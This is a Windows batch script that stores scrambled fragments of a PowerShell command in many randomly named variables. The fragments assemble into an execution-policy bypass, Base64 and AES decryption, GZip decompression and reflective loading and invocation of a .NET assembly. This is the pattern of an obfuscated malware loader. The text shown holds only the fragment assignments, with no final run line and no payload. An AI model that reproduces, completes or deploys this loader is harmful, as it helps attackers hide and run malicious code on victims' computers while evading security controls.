@echo off
set "ytaoPVsbRY=]::("
set "LWYObOMnDu=HR.T"
set "TytUcJpiKN=gsYZ"
set "pFiPoOQAOt=ment"
set "qhInGyGNJt=dWdD"
set "DTxSMkscDj=PzS."
set "qoauDxWiUU=gMod"
set "lVqheIgyRO=$hWg"
set "acZCkgzHDm=;$Jl"
set "GJyDXUJPTH=('Tg"
set "jLrfMhrUeV='[-1"
set "gaKkvtPRFq=TllA"
set "rCIfDfjBGX=Jlqm"
set "UzDZemNtzX=form"
set "TXjpcLgvDg= [Sy"
set "daNFXfDcAS=bypa"
set "BxohMYRaEd=yste"
set "ptjgKxaAPZ=.Cre"
set "zDQLrubciY=S.Su"
set "rJzLovBAcI=Obje"
set "sPwQXleWKt=rtS4"
set "znjNIscYBO=tryP"
set "mGyzDibFxA=WdDP"
set "TjXNfqDvFH=nkpH"
set "LjdCHEqbDs=tS46"
set "ACnKcyIQSw=..-1"
set "JZgKHYXApL=('%*'"
set "JOYVjjxztS=CFxo"
set "yogSviHCJs=PKCS"
set "etywmWPEPq=tion"
set "lZYVtPHOSo=l5E7"
set "YWszCqbpPh=();$"
set "XHzjTOXoAq=$cxI"
set "cALrjNUAjX=ress"
set "MkYoSOHSre=[Sys"
set "ZdWRrIXVft='0Pg"
set "dgOxjTlqoM=bstr"
set "sYpbeJgbdh=6] -"
set "SmGEaepZjr=[IO."
set "OKLHcuvogI=pStr"
set "lDyupJOTkN=orF'"
set "SnqrdDpbuo=ss -"
set "uhldLOKkgK=wwAj"
set "gqgnNGTwKC=.Cry"
set "QYkSHiSPTE=.Cop"
set "zDDDlnIpwI=).Sp"
set "tzQlkwLhRV=pose"
set "LWwVaHrUHD=P = "
set "DPQqmPgSGl=hy.A"
set "VCdgWvnqVJ=]::N"
set "XdSdstyqMn=ing("
set "IDpHlRlrAx=t Sy"
set "zLeFaOrROa=::De"
set "fcfFWUuidV=.Mem"
set "uDgHzRWXMo=KC);"
set "iXWExkpjna=-1.."
set "BMsbYzXXiZ=PzS "
set "ZzVwxUUMxu=16] "
set "KJExbMNRIk=embl"
set "rgJdqchhYv=.Key"
set "mRtaCPaJEH='')("
set "WxPUsPsFiX=-ep "
set "eSfcWXzNPR=($Ho"
set "vGKRMSxZuN=::('"
set "ZgjgcDxmAQ=ionM"
set "kNOXosYKOL=S46e"
set "GAUoFBStLD=$Hvv"
set "zMskObOppw=rity"
set "vmsHkgBPbb=.Sec"
set "rmBHSGVpDX=urit"
set "vDGVtHouHE=] -j"
set "eBebAkFjEm=RmAx"
set "FOIzlfAkpx=yTo("
set "toiwfgfcts=trea"
set "yrBBMHBKXg=L4Yi"
set "PdrEtmNMMA=lit("
set "rdxvEHhyOt=stem"
set "DIWJHTUOrn=$oQN"
set "zzyxTVIPnJ=e = "
set "rxkhwltZJO=ck($"
set "gmMxQVarDk=flec"
set "VQBVoXpsAr=ose("
set "nqEMLIeZCR=comp"
set "JZOxpkOtMV=s.En"
set "YcwsLWSaRs= = $"
set "hqToLwjDip=ress"
set "AMNZjdyput=)))"
set "AipACBYYEM=daeR"
set "NtBzbSrhqB=nkpH"
set "ybjMwqIrxC=H.Pa"
set "UxVKtDWvWz=Bmor"
set "iFpRStInIh=raph"
set "vmKBIxXZox=$dWd"
set "KRcSJFKCnZ=3); "
set "QzmibhDZjZ=em.C"
set "jCybcuPsFh=se()"
set "AYoUcIlzKx='txe"
set "sqTaIECrun=;$cx"
set "qWRsGKJnlM=gnir"
set "lwStvLLAFb=BC;$"
set "aSGbMrOWZo=tem."
set "obGRwwvZtR=Star"
set "FeZkNwJxsv=);$P"
set "LoLAYkXxXv=Disp"
set "PhQtxnbDfo=);$d"
set "bRuppnkdYw=[]] "
set "hukkZskwRo=6esa"
set "mMcFRarKYj=esaB"
set "fTXePzqjzC=iron"
set "QrSvYVAmup=New-"
